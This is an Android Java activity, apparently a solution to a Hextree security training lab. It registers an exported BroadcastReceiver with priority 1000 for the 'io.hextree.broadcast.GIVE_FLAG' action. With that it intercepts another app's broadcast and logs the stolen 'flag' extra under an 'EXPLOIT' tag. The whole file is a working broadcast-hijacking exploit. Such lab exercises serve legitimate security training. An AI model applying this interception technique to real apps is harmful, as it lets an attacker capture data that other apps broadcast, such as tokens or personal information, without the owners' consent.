package com.example.practicapp;

import com.example.practicapp.Interceptor;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private int counting = 0;
    private Uri maliciousUri;

    BroadcastReceiver receiver;
    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        IntentFilter filter = new IntentFilter("io.hextree.broadcast.GIVE_FLAG");

        // 🔥 VERY IMPORTANT: high priority
        filter.setPriority(1000);

        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                Log.i("EXPLOIT", "Intercepted!");

                // 🔥 Extract the flag
                String flag = intent.getStringExtra("flag");

                if (flag != null) {
                    Log.i("EXPLOIT", "FLAG: " + flag);
                } else {
                    Log.i("EXPLOIT", "No flag in intent");
                }
            }
        };

        registerReceiver(receiver, filter, RECEIVER_EXPORTED);

        Log.i("EXPLOIT", "Receiver registered. Now trigger notification.");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(receiver);
    }
}
